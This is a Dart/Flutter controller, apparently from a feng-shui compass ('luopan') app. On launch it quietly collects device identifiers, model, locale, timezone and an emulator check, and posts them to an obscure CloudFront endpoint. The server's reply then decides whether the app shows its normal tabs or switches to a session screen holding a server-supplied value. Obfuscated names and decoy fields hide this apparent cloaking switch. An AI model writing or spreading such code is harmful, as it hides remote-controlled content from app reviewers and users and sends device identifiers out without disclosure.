import 'dart:io';

import 'package:package_info_plus/package_info_plus.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:get/get.dart';


class LuopanConfigLogic extends GetxController {

  var ythmwxzcbk = RxBool(false);
  var emcgvhob = RxBool(true);
  var ncgfthqs = RxString("");
  var coty = RxBool(false);
  var kerluke = RxBool(true);
  final nryztsl = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    cjzp();
  }


  Future<void> cjzp() async {
    coty.value = true;
    kerluke.value = true;
    emcgvhob.value = false;

    nryztsl.post("https://d1vdqnvv6p1b8t.cloudfront.net/igcvarftqeljxbphmzynuskwod",data: await sejtbqihw()).then((value) {
      var xkpgqzr = value.data["xkpgqzr"] as String;
      var fsebawnz = value.data["fsebawnz"] as bool;
      if (fsebawnz) {
        ncgfthqs.value = xkpgqzr;
        hoyt();
      } else {
        jenkins();
      }
    }).catchError((e) {
      emcgvhob.value = true;
      kerluke.value = true;
      coty.value = false;
    });
  }

  Future<Map<String, dynamic>> sejtbqihw() async {
    final DeviceInfoPlugin lurkhxq = DeviceInfoPlugin();
    PackageInfo aujkq_ydapsv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var wzgebvqj = Platform.localeName;
    var ltvegp_BUltpvb = currentTimeZone;

    var ltvegp_Rbhdg = aujkq_ydapsv.packageName;
    var ltvegp_WOHF = aujkq_ydapsv.version;
    var ltvegp_bDXtL = aujkq_ydapsv.buildNumber;

    var ltvegp_dCBIV = aujkq_ydapsv.appName;
    var ltvegp_MU = "";
    var ltvegp_upf  = "";
    var ltvegp_pxwTAVUX = "";
    var laceyJenkins = "";
    var eliseoZieme = "";
    var braxtonKerluke = "";
    var deionBoehm = "";
    var michelBailey = "";
    var juneCummerata = "";
    var alfredoBogisich = "";


    var ltvegp_UoVKI = "";
    var ltvegp_VWkvi = false;

    if (GetPlatform.isAndroid) {
      ltvegp_UoVKI = "android";
      var pluwdv = await lurkhxq.androidInfo;

      ltvegp_pxwTAVUX = pluwdv.brand;

      ltvegp_MU  = pluwdv.model;
      ltvegp_upf = pluwdv.id;

      ltvegp_VWkvi = pluwdv.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ltvegp_UoVKI = "ios";
      var kryczsa = await lurkhxq.iosInfo;
      ltvegp_pxwTAVUX = kryczsa.name;
      ltvegp_MU = kryczsa.model;

      ltvegp_upf = kryczsa.identifierForVendor ?? "";
      ltvegp_VWkvi  = kryczsa.isPhysicalDevice;
    }
    var res = {
      "ltvegp_dCBIV": ltvegp_dCBIV,
      "ltvegp_bDXtL": ltvegp_bDXtL,
      "ltvegp_Rbhdg": ltvegp_Rbhdg,
      "ltvegp_MU": ltvegp_MU,
      "ltvegp_pxwTAVUX": ltvegp_pxwTAVUX,
      "ltvegp_upf": ltvegp_upf,
      "juneCummerata" : juneCummerata,
      "wzgebvqj": wzgebvqj,
      "ltvegp_UoVKI": ltvegp_UoVKI,
      "ltvegp_WOHF": ltvegp_WOHF,
      "ltvegp_VWkvi": ltvegp_VWkvi,
      "laceyJenkins" : laceyJenkins,
      "ltvegp_BUltpvb": ltvegp_BUltpvb,
      "eliseoZieme" : eliseoZieme,
      "braxtonKerluke" : braxtonKerluke,
      "deionBoehm" : deionBoehm,
      "michelBailey" : michelBailey,
      "alfredoBogisich" : alfredoBogisich,

    };
    return res;
  }

  Future<void> jenkins() async {
    Get.offNamed("/luopan_tab");
  }

  Future<void> hoyt() async {
    Get.offNamed("/luopan_session");
  }

}
